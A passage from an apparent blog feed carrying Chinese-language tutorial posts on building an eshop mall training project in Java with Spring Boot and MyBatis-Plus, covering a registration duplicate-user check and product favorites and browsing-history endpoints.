.eq(ShopUser::getPhone,param.getAccount()),<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    authService.register(param);</span><br><span class="line">    <span class="keyword">return</span> ApiResult.ok(<span class="string">&quot;&quot;</span>,<span class="string">&quot;注册成功&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此编写以下代码对<code>shopUser</code>进行是否为空对象判断：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ObjectUtil.isNotNull(shopUser))&#123;</span><br><span class="line">    <span class="keyword">return</span> ApiResult.fail(<span class="string">&quot;用户已存在&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经测试后成功！！</p>]]></content>
    
    
    <summary type="html">eshop商城项目实训代码重构</summary>
    
    
    
    <category term="Java" scheme="https://www.777nx.cn/categories/Java/"/>
    
    
    <category term="eshop" scheme="https://www.777nx.cn/tags/eshop/"/>
    
  </entry>
  
  <entry>
    <title>eshop商城项目实训源码</title>
    <link href="https://www.777nx.cn/posts/3bc4be07.html"/>
    <id>https://www.777nx.cn/posts/3bc4be07.html</id>
    <published>2023-03-29T13:59:53.000Z</published>
    <updated>2023-12-27T02:51:31.418Z</updated>
    
    <content type="html"><![CDATA[<div class="note info no-icon flat"><p><strong>eshop商城项目实训系列教程导航</strong></p><ol><li><a href="https://www.777nx.cn/posts/3bc4be07.html">eshop商城项目实训源码</a> &lt;= 当前位置</li><li><a href="https://www.777nx.cn/posts/f56b144a.html">eshop商城项目实训代码重构</a></li></ol></div><h2 id="基本架构">基本架构</h2><p>要先把基本框架搭建起来，才能够愉快的写代码</p><h3 id="1-domain">1. domain</h3><p>在<code>eshop-business</code>模块下新建<code>src\main\java</code>的文件夹，在该文件夹下创建<code>com.eshop.modules.business.domain</code>的包，在该包下创建<code>StoreProductRelation</code>的实体类，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.eshop.<span class="keyword">module</span>.business.domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.IdType;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.TableId;</span><br><span class="line"><span class="keyword">import</span> com.eshop.domain.BaseDomain;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiModelProperty;</span><br><span class="line"><span class="keyword">import</span> lombok.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@Builder</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StoreProductRelation</span> <span class="keyword">extends</span> <span class="title class_">BaseDomain</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@TableId(value = &quot;id&quot;, type = IdType.AUTO)</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;用户ID&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Long uid;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;商品ID&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Long productId;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;类型(收藏(collect）、点赞(like)、足迹(foot))&quot;)</span></span><br><span class="line"><span class="meta">    private String type;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    @ApiModelProperty(value = &quot;某种类型的商品(普通商品、秒杀商品)&quot;)</span></span><br><span class="line"><span class="meta">    private String category;</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><p>部分注解说明：</p><ul><li>@Builder：为类生成相对略微复杂的构建器 API</li><li>@ApiModelProperty：添加和操作属性模块的数据</li></ul><h3 id="2-mapper">2. mapper</h3><p>在<code>mapper</code>的包下新建<code>ProductRelationMapper</code>的类，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.eshop.<span class="keyword">module</span>.business.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.eshop.common.mapper.CoreMapper;</span><br><span class="line"><span class="keyword">import</span> com.eshop.<span class="keyword">module</span>.business.domain.StoreProductRelation;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ProductRelationMapper</span> <span class="keyword">extends</span> <span class="title class_">CoreMapper</span>&lt;StoreProductRelation&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中接口<code>ProductRelationMapper</code>继承的<code>CoreMapper</code>，<code>CoreMapper</code>继承<code>BaseMapper</code>，相当于<code>ProductRelationMapper</code>继承<code>CoreMapper</code></p><p><img src="https://img.777nx.cn/test/image-20230329123904643.png" alt="image-20230329123904643"></p><h3 id="3-service">3. service</h3><p>在<code>service</code>的包下新建<code>ProductRelationService</code>的类，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.eshop.<span class="keyword">module</span>.business.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.eshop.common.service.BaseService;</span><br><span class="line"><span class="keyword">import</span> com.eshop.<span class="keyword">module</span>.business.domain.StoreProductRelation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ProductRelationService</span> <span class="keyword">extends</span> <span class="title class_">BaseService</span>&lt;StoreProductRelation&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建<code>ProductRelationServiceImpl</code>的实现类，实现<code>ProductRelationService</code>的接口，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.eshop.<span class="keyword">module</span>.business.service.impl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.toolkit.Wrappers;</span><br><span class="line"><span class="keyword">import</span> com.eshop.api.EshopException;</span><br><span class="line"><span class="keyword">import</span> com.eshop.common.service.impl.BaseServiceImpl;</span><br><span class="line"><span class="keyword">import</span> com.eshop.dozer.service.IGenerator;</span><br><span class="line"><span class="keyword">import</span> com.eshop.<span class="keyword">module</span>.business.domain.StoreProductRelation;</span><br><span class="line"><span class="keyword">import</span> com.eshop.<span class="keyword">module</span>.business.mapper.ProductRelationMapper;</span><br><span class="line"><span class="keyword">import</span> com.eshop.<span class="keyword">module</span>.business.service.ProductRelationService;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@Transactional(rollbackFor = Exception.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProductRelationServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">BaseServiceImpl</span>&lt;ProductRelationMapper, StoreProductRelation&gt; <span class="keyword">implements</span> <span class="title class_">ProductRelationService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ProductRelationMapper productRelationMapper;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> IGenerator generator;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-controller">4. controller</h3><p>在<code>com.eshop</code>下新建一个包，包名叫<code>controller</code>，新建一个类，类名叫<code>ProductCollectController</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.eshop.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.eshop.<span class="keyword">module</span>.business.service.ProductRelationService;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.Api;</span><br><span class="line"><span class="keyword">import</span> lombok.RequiredArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Api(value = &quot;产品模块&quot;, tags = &quot;商城:产品模块&quot;)</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor(onConstructor = @__(@Autowired))</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProductCollectController</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ProductRelationService productRelationService;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部分注解说明：</p><ul><li>@Api：用在请求的类上,表示对类的说明</li><li>@RequiredArgsConstructor：生成带有必需参数的构造函数</li></ul><h2 id="功能编码">功能编码</h2><h3 id="1-商品添加收藏">1. 商品添加收藏</h3><p>前端发过来的请求(使用的是post方式)：<code>http://localhost:8008/api/collect/add</code></p><p><img src="https://img.777nx.cn/test/image-20230329114943308.png" alt="image-20230329114943308"></p><p>看报错<code>Request method 'POST' not supported</code>，不支持请求方法“POST”</p><p>开始编写controller层的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 添加收藏</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> param body部分，需要查询的参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 是否成功：成功 true，失败 false</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@AppLog(value = &quot;添加收藏&quot;, type = 1)</span></span><br><span class="line"><span class="meta">@NoRepeatSubmit</span></span><br><span class="line"><span class="meta">@AuthCheck</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;//collect/add&quot;)</span></span><br><span class="line"><span class="meta">@ApiModelProperty(value = &quot;添加收藏&quot;, notes = &quot;添加收藏&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ApiResult&lt;Boolean&gt; <span class="title function_">collectAdd</span><span class="params">(<span class="meta">@Validated</span> <span class="meta">@RequestBody</span> StoreProductRelationQueryParam param)</span>&#123;</span><br><span class="line">    <span class="type">Long</span> <span class="variable">uid</span> <span class="operator">=</span> LocalUser.getUser().getUid();</span><br><span class="line">    <span class="keyword">if</span> (!NumberUtil.isNumber(param.getId()))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EshopException</span>(<span class="string">&quot;参数非法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调业务层</span></span><br><span class="line">    productRelationService.addRroductRelation(Long.valueOf(param.getId()), uid, param.getCategory());</span><br><span class="line">    <span class="keyword">return</span> ApiResult.ok();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部分注解说明：</p><ul><li>@AppLog：自定义日志注解</li><li>@NoRepeatSubmit：防止重复提交自定义注解</li><li>@AuthCheck：自定义注解实现用户行为认证</li><li>@ApiModelProperty：添加和操作属性模块的数据</li></ul><h4 id="1-1-是否收藏">1.1 是否收藏</h4><p>service接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 是否收藏</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> productId 商品ID</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uid 用户ID</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Boolean</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">Boolean <span class="title function_">isProductRelation</span><span class="params">(<span class="type">long</span> productId, <span class="type">long</span> uid)</span>;</span><br></pre></td></tr></table></figure><p>实现该业务功能：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 是否收藏</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> productId 商品ID</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uid 用户ID</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Boolean</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Boolean <span class="title function_">isProductRelation</span><span class="params">(<span class="type">long</span> productId, <span class="type">long</span> uid)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> productRelationMapper</span><br><span class="line">            .selectCount(Wrappers.&lt;StoreProductRelation&gt;lambdaQuery()</span><br><span class="line">                    .eq(StoreProductRelation::getUid,uid)</span><br><span class="line">                    .eq(StoreProductRelation::getType,<span class="string">&quot;collect&quot;</span>)</span><br><span class="line">                    .eq(StoreProductRelation::getProductId,productId));</span><br><span class="line">    <span class="keyword">if</span>(count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-2-添加收藏">1.2 添加收藏</h4><p>service接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *添加收藏</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> productId 商品id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uid 用户id</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">addRroductRelation</span><span class="params">(<span class="type">long</span> productId,<span class="type">long</span> uid,String category)</span>;</span><br></pre></td></tr></table></figure><p>实现该业务功能：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 添加收藏</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> productId 商品id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uid 用户id</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addRroductRelation</span><span class="params">(<span class="type">long</span> productId,<span class="type">long</span> uid,String category)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(isProductRelation(productId,uid)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EshopException</span>(<span class="string">&quot;已收藏&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">StoreProductRelation</span> <span class="variable">storeProductRelation</span> <span class="operator">=</span> StoreProductRelation.builder()</span><br><span class="line">            .productId(productId)</span><br><span class="line">            .uid(uid)</span><br><span class="line">            .type(category)</span><br><span class="line">            .build();</span><br><span class="line">    productRelationMapper.insert(storeProductRelation);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-商品取消收藏">2. 商品取消收藏</h3><p>前端发过来的请求(使用的是post方式)：<code>http://localhost:8008/api/collect/del</code></p><p>controller层：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 取消收藏</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@AppLog(value = &quot;取消收藏&quot;, type = 1)</span></span><br><span class="line"><span class="meta">@NoRepeatSubmit</span></span><br><span class="line"><span class="meta">@AuthCheck</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/collect/del&quot;)</span></span><br><span class="line"><span class="meta">@ApiOperation(value = &quot;取消收藏&quot;,notes = &quot;取消收藏&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ApiResult&lt;Boolean&gt; <span class="title function_">collectDel</span><span class="params">(<span class="meta">@Validated</span> <span class="meta">@RequestBody</span> StoreProductRelationQueryParam param)</span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">uid</span> <span class="operator">=</span> LocalUser.getUser().getUid();</span><br><span class="line">    <span class="keyword">if</span>(!NumberUtil.isNumber(param.getId())) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EshopException</span>(<span class="string">&quot;参数非法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    productRelationService.delRroductRelation(Long.valueOf(param.getId()),</span><br><span class="line">            uid,param.getCategory());</span><br><span class="line">    <span class="keyword">return</span> ApiResult.ok();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>service接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 取消收藏</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> productId 商品id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uid 用户id</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">delRroductRelation</span><span class="params">(<span class="type">long</span> productId,<span class="type">long</span> uid,String category)</span>;</span><br></pre></td></tr></table></figure><p>实现该业务功能：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 取消收藏</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> productId 商品id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uid 用户id</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delRroductRelation</span><span class="params">(<span class="type">long</span> productId,<span class="type">long</span> uid,String category)</span> &#123;</span><br><span class="line">    <span class="type">StoreProductRelation</span> <span class="variable">productRelation</span> <span class="operator">=</span> <span class="built_in">this</span>.lambdaQuery()</span><br><span class="line">            .eq(StoreProductRelation::getProductId,productId)</span><br><span class="line">            .eq(StoreProductRelation::getUid,uid)</span><br><span class="line">            .eq(StoreProductRelation::getType,category)</span><br><span class="line">            .one();</span><br><span class="line">    <span class="keyword">if</span>(productRelation == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EshopException</span>(<span class="string">&quot;已取消&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.removeById(productRelation.getId());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-批量删除收藏-足迹">3. 批量删除收藏/足迹</h3><p>前端发过来的请求(使用的是post方式)：<code>http://localhost:8008/api/collect/dels/&#123;productIds&#125;</code></p><p>controller层：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AppLog(value = &quot;批量取消收藏&quot;, type = 1)</span></span><br><span class="line"><span class="meta">@NoRepeatSubmit</span></span><br><span class="line"><span class="meta">@AuthCheck</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/collect/dels/&#123;productIds&#125;&quot;)</span></span><br><span class="line"><span class="meta">@ApiOperation(value = &quot;批量取消收藏&quot;,notes = &quot;批量取消收藏&quot;)</span></span><br><span class="line"><span class="meta">@Transactional(rollbackFor = Exception.class)</span></span><br><span class="line"><span class="keyword">public</span> ApiResult&lt;Boolean&gt; <span class="title function_">collectDels</span><span class="params">(<span class="meta">@PathVariable</span> String productIds,<span class="meta">@RequestBody</span> StoreProductRelationQueryParam param)</span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">uid</span> <span class="operator">=</span> LocalUser.getUser().getUid();</span><br><span class="line">    String[] ids = productIds.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(ids.length &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span> (String id : ids)&#123;</span><br><span class="line">            productRelationService.delRroductRelation(Long.parseLong(id), uid, param.getCategory());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EshopException</span>(<span class="string">&quot;参数非法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ApiResult.ok();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-获取收藏或足迹">4. 获取收藏或足迹</h3><p>前端发过来的请求(使用的是get方式)：<code>http://localhost:8008/api/collect/user</code></p><p>controller层：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AuthCheck</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/collect/user&quot;)</span></span><br><span class="line">    <span class="meta">@ApiImplicitParams(&#123;</span></span><br><span class="line"><span class="meta">            @ApiImplicitParam(name = &quot;page&quot;, value = &quot;页码,默认为1&quot;, paramType = &quot;query&quot;, dataType = &quot;int&quot;),</span></span><br><span class="line"><span class="meta">            @ApiImplicitParam(name = &quot;limit&quot;, value = &quot;页大小,默认为10&quot;, paramType = &quot;query&quot;, dataType = &quot;int&quot;),</span></span><br><span class="line"><span class="meta">            @ApiImplicitParam(name = &quot;type&quot;, value = &quot;foot为足迹,collect为收藏&quot;, paramType = &quot;query&quot;, dataType = &quot;String&quot;)</span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;获取收藏产品,或足迹&quot;,notes = &quot;获取收藏产品,或足迹&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ApiResult&lt;List&lt;StoreProductRelationQueryVo&gt;&gt; <span class="title function_">collectUser</span><span class="params">(<span class="meta">@RequestParam(value = &quot;page&quot;,defaultValue = &quot;1&quot;)</span> <span class="type">int</span> page,</span></span><br><span class="line"><span class="params">                                                                    <span class="meta">@RequestParam(value = &quot;limit&quot;,defaultValue = &quot;500&quot;)</span> <span class="type">int</span> limit,</span></span><br><span class="line"><span class="params">                                                                    <span class="meta">@RequestParam(value = &quot;type&quot;)</span> String type)</span>&#123;</span><br><span class="line">        <span class="type">Long</span> <span class="variable">uid</span> <span class="operator">=</span> LocalUser.getUser().getUid();</span><br><span class="line">        List&lt;StoreProductRelationQueryVo&gt; storeProductRelationQueryVos = productRelationService.userCollectProduct(page, limit, uid, type);</span><br><span class="line">        <span class="keyword">return</span> ApiResult.ok(storeProductRelationQueryVos);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此时我们现有的实体类对象返回的数据，并不能够满足我们的需求，因此需要在<code>vo</code>包下造个<code>StoreProductRelationQueryVo</code>的类，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 